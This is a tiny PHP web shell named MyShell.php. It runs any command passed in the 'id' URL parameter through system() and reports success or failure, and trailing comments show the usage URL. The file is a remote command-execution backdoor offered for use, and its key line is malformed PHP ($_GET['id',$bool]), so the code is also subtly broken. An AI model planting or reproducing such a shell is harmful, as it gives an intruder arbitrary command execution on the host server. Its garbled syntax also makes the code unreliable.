<?php
	echo '<pre><hr/>';
	system($_GET['id',$bool]);
	if($bool!=0){
		echo'<strong>[-] Command not found!</strong><hr/></pre>';
	}else{
		echo'<hr/><strong>[+] Executed successfully</strong></pre>';
	}
?>
<!--http://.../MyShell.php?id=[your_command]-->
<!--This shell can only use turn on the system() function-->